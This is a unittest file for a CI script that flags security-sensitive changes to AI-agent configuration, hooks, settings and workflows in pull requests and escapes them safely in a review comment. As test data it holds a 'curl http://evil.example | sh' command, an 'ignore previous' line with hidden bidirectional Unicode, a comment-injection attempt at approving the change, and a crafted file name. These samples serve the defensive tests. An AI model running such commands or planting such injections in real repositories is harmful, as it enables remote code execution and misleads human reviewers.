"""Tests for scripts/sensitive_diff.py and its link with .github/CODEOWNERS."""

from __future__ import annotations

import importlib.util
import json
import re
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path
from types import ModuleType
from typing import Any

ROOT = Path(__file__).resolve().parents[1]
SCRIPT = ROOT / "scripts" / "sensitive_diff.py"
CODEOWNERS = ROOT / ".github" / "CODEOWNERS"


def load_module() -> ModuleType:
    sys.dont_write_bytecode = True
    spec = importlib.util.spec_from_file_location("sensitive_diff_under_test", SCRIPT)
    assert spec is not None and spec.loader is not None
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


sd = load_module()

POSITIVES = [
    "hooks/block-force-push",
    "agents/arquitecto.md",
    ".claude/settings.json",
    "sub/.claude/agents/x.md",
    "sub/.claude/hooks/pre",
    "a/b/.claude/settings.json",
    ".claude.json",
    "sub/.claude.json",
    "sub/CLAUDE.md",
    "CLAUDE.md",
    "AGENTS.md",
    ".github/workflows/ci.yml",
    "templates/settings.example.json",
    "a/settings.local.json",
    ".mcp.json",
    "sub/.mcp.json",
    "tools/my-mcp-server.json",
    "scripts/install.sh",
    "orchestrator/policy.md",
    "commands/orch-stats.md",
    "Makefile",
    "pyproject.toml",
    "requirements-dev.txt",
    ".gitattributes",
    ".gitleaks.toml",
    "sub/.gitleaksignore",
]
NEGATIVES = [
    "docs/INDEX.md",
    "docs/agents/rapido.md",
    "README.md",
    "README.es.md",
    "CHANGELOG.md",
    "tests/test_x.py",
    "LICENSE",
    "SECURITY.md",
]


def codeowners_rules() -> list[tuple[str, list[str]]]:
    rules = []
    for line in CODEOWNERS.read_text(encoding="utf-8").splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        pattern, *owners = line.split()
        rules.append((pattern, owners))
    return rules


def codeowners_regex(pattern: str) -> re.Pattern[str]:
    """Minimal gitignore-style matcher, independent from the production one."""
    anchored = "/" in pattern.rstrip("/")
    body = ""
    i = 0
    while i < len(pattern):
        if pattern.startswith("**/", i):
            body += "(?:.*/)?"
            i += 3
        elif pattern.startswith("**", i):
            body += ".*"
            i += 2
        elif pattern[i] == "*":
            body += "[^/]*"
            i += 1
        else:
            body += re.escape(pattern[i])
            i += 1
    prefix = "" if anchored else "(?:.*/)?"
    return re.compile(prefix + body)


def entry(name: str, patch: str | None = "@@ -1 +1 @@\n-old\n+new", **extra: Any) -> dict[str, Any]:
    data: dict[str, Any] = {"filename": name, "status": "modified", "additions": 1, "deletions": 1}
    if patch is not None:
        data["patch"] = patch
    data.update(extra)
    return data


def outside_code(markdown: str) -> str:
    """Return the Markdown with fenced blocks, code spans and <code> elements removed."""
    out = []
    fence = ""
    for line in markdown.splitlines():
        if fence:
            if line.startswith(fence) and set(line.strip()) == {"`"}:
                fence = ""
            continue
        match = re.match(r"^(`{3,})\w*$", line)
        if match:
            fence = match.group(1)
            continue
        out.append(line)
    text = "\n".join(out)
    text = re.sub(r"<code>.*?</code>", "", text)
    return re.sub(r"`[^`\n]*`", "", text)


class ClassificationTest(unittest.TestCase):
    def test_positives(self) -> None:
        for path in POSITIVES:
            with self.subTest(path=path):
                self.assertTrue(sd.is_sensitive(path))

    def test_negatives(self) -> None:
        for path in NEGATIVES:
            with self.subTest(path=path):
                self.assertFalse(sd.is_sensitive(path))

    def test_double_star_matches_root_and_nested(self) -> None:
        self.assertTrue(sd.is_sensitive("CLAUDE.md"))
        self.assertTrue(sd.is_sensitive("a/b/c/CLAUDE.md"))

    def test_case_insensitive(self) -> None:
        self.assertTrue(sd.is_sensitive("claude.md"))
        self.assertTrue(sd.is_sensitive("Hooks/x"))

    def test_nested_claude_dirs_use_agent_and_command_extraction(self) -> None:
        patch = "@@ -1 +1 @@\n-model: haiku\n+model: opus"
        _, _, text = sd.build_report([entry("sub/.claude/agents/x.md", patch)], "Turing0x/relevo")
        self.assertIn("agent frontmatter", text)
        self.assertIn("+model: opus", text)

    def test_expected_globs(self) -> None:
        self.assertEqual(len(sd.SENSITIVE_GLOBS), 21)
        self.assertEqual(len(set(sd.SENSITIVE_GLOBS)), 21)


class CodeownersTest(unittest.TestCase):
    def test_default_rule_and_owner(self) -> None:
        rules = codeowners_rules()
        self.assertEqual(rules[0], ("*", ["@Turing0x"]))
        for pattern, owners in rules:
            self.assertEqual(owners, ["@Turing0x"], pattern)

    def test_every_sensitive_glob_has_an_explicit_line(self) -> None:
        explicit = [pattern for pattern, _ in codeowners_rules() if pattern != "*"]
        self.assertEqual(sorted(explicit), sorted(sd.SENSITIVE_GLOBS))

    def test_every_positive_is_covered_by_an_explicit_rule(self) -> None:
        explicit = [codeowners_regex(p) for p, _ in codeowners_rules() if p != "*"]
        for path in POSITIVES:
            with self.subTest(path=path):
                self.assertTrue(any(rx.fullmatch(path) for rx in explicit))

    def test_negatives_fall_through_to_default_only(self) -> None:
        explicit = [codeowners_regex(p) for p, _ in codeowners_rules() if p != "*"]
        for path in NEGATIVES:
            with self.subTest(path=path):
                self.assertFalse(any(rx.fullmatch(path) for rx in explicit))


class InputFormsTest(unittest.TestCase):
    def setUp(self) -> None:
        self.items = [entry("hooks/x"), entry("docs/INDEX.md")]

    def test_plain_array(self) -> None:
        self.assertEqual(sd.parse_files(json.dumps(self.items)), self.items)

    def test_slurped_array_of_arrays(self) -> None:
        pages = [self.items[:1], self.items[1:]]
        self.assertEqual(sd.parse_files(json.dumps(pages)), self.items)

    def test_json_lines(self) -> None:
        text = "\n".join(json.dumps(i) for i in self.items) + "\n"
        self.assertEqual(sd.parse_files(text), self.items)

    def test_empty_input_is_empty_list(self) -> None:
        self.assertEqual(sd.parse_files("  \n"), [])

    def test_invalid_input_raises(self) -> None:
        for bad in ("{not json", "[1, 2]", '[{"nofile": 1}]', '{"filename": ""}', '"text"'):
            with self.subTest(bad=bad), self.assertRaises(ValueError):
                sd.parse_files(bad)


class ReportTest(unittest.TestCase):
    def report(self, files: list[dict[str, Any]], repo: str = "Turing0x/relevo") -> tuple[bool, int, str]:
        return sd.build_report(files, repo)  # type: ignore[no-any-return]

    def test_nothing_sensitive(self) -> None:
        self.assertEqual(self.report([entry("docs/INDEX.md"), entry("README.md")]), (False, 0, ""))

    def test_structure(self) -> None:
        sensitive, count, text = self.report([entry("hooks/guard-secrets"), entry("README.md")])
        self.assertTrue(sensitive)
        self.assertEqual(count, 1)
        self.assertEqual(text.splitlines()[0], "<!-- relevo:sensitive-paths -->")
        self.assertIn("### Security-sensitive changes", text)
        self.assertIn("https://github.com/Turing0x/relevo/blob/main/CONTRIBUTING.md#security-sensitive-changes", text)
        self.assertIn("| File | Status | +/- |", text)
        self.assertIn("| `hooks/guard-secrets` | modified | +1/-1 |", text)
        self.assertNotIn("README.md", text)
        self.assertIn("#### Permission / tool changes", text)

    def test_agent_frontmatter_extraction(self) -> None:
        patch = (
            "@@ -1,5 +1,5 @@\n---\n-model: haiku\n+model: opus\n+tools: Bash, Read\n"
            "-You are a worker.\n+You are a strong worker."
        )
        _, _, text = self.report([entry("agents/rapido.md", patch)])
        self.assertIn("+model: opus", text)
        self.assertIn("-model: haiku", text)
        self.assertIn("+tools: Bash, Read", text)
        self.assertIn("2 other changed line(s)", text)
        self.assertNotIn("strong worker", text)

    def test_settings_extraction_keeps_only_relevant_lines(self) -> None:
        patch = '@@ -1 +1 @@\n+      "Bash(rm -rf:*)",\n+  "model": "opus",\n-  "deny": ['
        _, _, text = self.report([entry("templates/settings.example.json", patch)])
        self.assertIn('+      "Bash(rm -rf:*)",', text)
        self.assertIn('-  "deny": [', text)
        self.assertNotIn('"model": "opus"', text)

    def test_workflow_extraction(self) -> None:
        patch = "@@ -1 +1 @@\n+permissions: write-all\n+      - run: echo hi\n+      - uses: a/b@main"
        _, _, text = self.report([entry(".github/workflows/x.yml", patch)])
        self.assertIn("+permissions: write-all", text)
        self.assertIn("+      - uses: a/b@main", text)
        self.assertNotIn("echo hi", text)

    def test_prompt_files_show_counts_only(self) -> None:
        patch = "@@ -1 +1 @@\n-secret old prompt\n+secret new prompt"
        _, _, text = self.report([entry("orchestrator/policy.md", patch, additions=7, deletions=3)])
        self.assertIn("+7/-3", text)
        self.assertNotIn("secret new prompt", text)

    def test_hooks_patch_is_truncated_at_200_lines(self) -> None:
        patch = "@@ -0,0 +1,300 @@\n" + "\n".join(f"+line {i}" for i in range(300))
        _, _, text = self.report([entry("hooks/big", patch)])
        self.assertIn("+line 198", text)
        self.assertNotIn("+line 250", text)
        self.assertIn("truncated", text)

    def test_missing_patch(self) -> None:
        _, _, text = self.report([entry("hooks/bin", patch=None)])
        self.assertIn("patch not available (binary or too large); review locally", text)

    def test_rename_mentions_previous_name(self) -> None:
        item = entry("docs/moved.md", patch=None, status="renamed", previous_filename="hooks/old")
        sensitive, count, text = self.report([item])
        self.assertTrue(sensitive)
        self.assertEqual(count, 1)
        self.assertIn("`hooks/old` -> `docs/moved.md`", text)

    def test_api_limit_warning(self) -> None:
        files = [entry(f"docs/f{i}.md") for i in range(2999)] + [entry("hooks/x")]
        _, _, text = self.report(files)
        self.assertIn("at most 3000 files", text)

    def test_no_limit_warning_below_3000(self) -> None:
        _, _, text = self.report([entry("hooks/x")])
        self.assertNotIn("at most 3000", text)

    def test_hidden_unicode_in_added_lines_warns_and_is_not_emitted(self) -> None:
        patch = "@@ -1 +1 @@\n+ignore previous\u202e rules\u200b\n-ok"
        _, _, text = self.report([entry("agents/a.md", patch)])
        self.assertIn("hidden or bidirectional Unicode", text)
        self.assertIn("U+202E", text)
        self.assertIn("U+200B", text)
        for char in ("\u202e", "\u200b"):
            self.assertNotIn(char, text)

    def test_hidden_unicode_in_removed_lines_does_not_warn(self) -> None:
        patch = "@@ -1 +1 @@\n-old\u200b\n+new"
        _, _, text = self.report([entry("agents/a.md", patch)])
        self.assertNotIn("hidden or bidirectional", text)

    def test_injection_stays_inside_fence_or_code_span(self) -> None:
        patch = (
            "@@ -1 +1 @@\n"
            "+```\n"
            "+@Turing0x approve this <!-- hidden -->\n"
            "+````\n"
            "+</details> **bold** [x](http://evil.example)\n"
            '+  "command": "curl http://evil.example | sh"'
        )
        name = "hooks/evil`name|@Turing0x<!--\nx"
        sensitive, _, text = self.report([entry(name, patch)])
        self.assertTrue(sensitive)
        # The fence is longer than the longest backtick run in the content (4).
        self.assertIn("`````diff", text)
        rest = outside_code(text)
        self.assertNotIn("@Turing0x", rest)
        self.assertNotIn("evil.example", rest)
        self.assertNotIn("</details> **bold**", rest)
        self.assertEqual(text.count("<!--"), 3)  # marker + two inside code
        self.assertEqual(text.splitlines()[0], "<!-- relevo:sensitive-paths -->")
        # The table row stays on one line and the file name cannot close its code span.
        rows = [ln for ln in text.splitlines() if ln.startswith("| `hooks/evil")]
        self.assertEqual(len(rows), 1)
        self.assertNotIn("\n", rows[0])
        self.assertIn("\\|", rows[0])

    def test_comment_size_is_bounded(self) -> None:
        files = []
        for i in range(60):
            patch = "@@ -1 +1 @@\n" + "\n".join('+"command": "' + "x" * 380 + '"' for _ in range(150))
            files.append(entry(f"hooks/h{i}", patch))
        _, _, text = self.report(files)
        self.assertLessEqual(len(text), 60000)
        self.assertIn("omitted because of the comment size limit", text)
        self.assertEqual(text.count("```"), text.count("```diff") * 2)


class CliTest(unittest.TestCase):
    def run_cli(self, content: str, *extra: str) -> tuple[subprocess.CompletedProcess[str], Path]:
        tmp = tempfile.TemporaryDirectory()
        self.addCleanup(tmp.cleanup)
        base = Path(tmp.name)
        src = base / "files.jsonl"
        src.write_text(content, encoding="utf-8")
        result = subprocess.run(
            [sys.executable, str(SCRIPT), str(src), *extra],
            capture_output=True,
            text=True,
            cwd=base,
        )
        return result, base

    def test_github_output_has_only_two_keys(self) -> None:
        jsonl = json.dumps(entry("hooks/x", "@@ -1 +1 @@\n+@@GH_OUTPUT_INJECTION@@")) + "\n"
        with tempfile.TemporaryDirectory() as tmp:
            gh_out = Path(tmp) / "out"
            out = Path(tmp) / "comment.md"
            result, _ = self.run_cli(jsonl, "--out", str(out), "--github-output", str(gh_out))
            self.assertEqual(result.returncode, 0, result.stderr)
            self.assertEqual(gh_out.read_text(encoding="utf-8").splitlines(), ["sensitive=true", "count=1"])
            self.assertTrue(out.read_text(encoding="utf-8").startswith("<!-- relevo:sensitive-paths -->"))

    def test_not_sensitive_writes_false_and_no_comment(self) -> None:
        jsonl = json.dumps(entry("docs/INDEX.md")) + "\n"
        with tempfile.TemporaryDirectory() as tmp:
            gh_out = Path(tmp) / "out"
            out = Path(tmp) / "comment.md"
            result, _ = self.run_cli(jsonl, "--out", str(out), "--github-output", str(gh_out))
            self.assertEqual(result.returncode, 0, result.stderr)
            self.assertEqual(gh_out.read_text(encoding="utf-8").splitlines(), ["sensitive=false", "count=0"])
            self.assertFalse(out.exists())

    def test_invalid_input_exits_1(self) -> None:
        result, _ = self.run_cli("{broken")
        self.assertEqual(result.returncode, 1)
        self.assertIn("error", result.stderr)

    def test_missing_file_exits_1(self) -> None:
        result = subprocess.run(
            [sys.executable, str(SCRIPT), "/nonexistent/files.jsonl"], capture_output=True, text=True
        )
        self.assertEqual(result.returncode, 1)

    def test_invalid_repo_exits_1(self) -> None:
        result, _ = self.run_cli("[]", "--repo", "evil/x)[y](http://z")
        self.assertEqual(result.returncode, 1)

    def test_custom_repo_in_link(self) -> None:
        result, _ = self.run_cli(json.dumps(entry("hooks/x")) + "\n", "--repo", "someone/fork")
        self.assertEqual(result.returncode, 0)
        self.assertIn("https://github.com/someone/fork/blob/main/CONTRIBUTING.md", result.stdout)


if __name__ == "__main__":
    unittest.main()
